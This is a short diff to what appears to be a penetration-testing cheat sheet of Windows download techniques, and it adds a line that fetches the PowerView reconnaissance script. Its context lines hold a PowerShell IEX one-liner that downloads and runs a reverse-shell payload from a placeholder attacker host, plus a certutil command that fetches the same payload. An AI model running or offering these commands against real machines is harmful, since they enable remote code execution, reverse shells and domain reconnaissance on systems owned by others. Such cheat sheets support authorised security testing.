@@ -207,9 +207,10 @@ Download and execute file using powershell:
 
 	powershell -c 'IEX(New-Object Net.WebClient).downloadstring("http://<localhostip>/rev_shell")'
 
-Download file:
+Download files:
 
 	certutil.exe -urlcache -f http://<localhostip>/rev_shell <path_to_where_file_is_gonna_be_saved>
+	(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
 
 Good dir to save, download and write files:
 
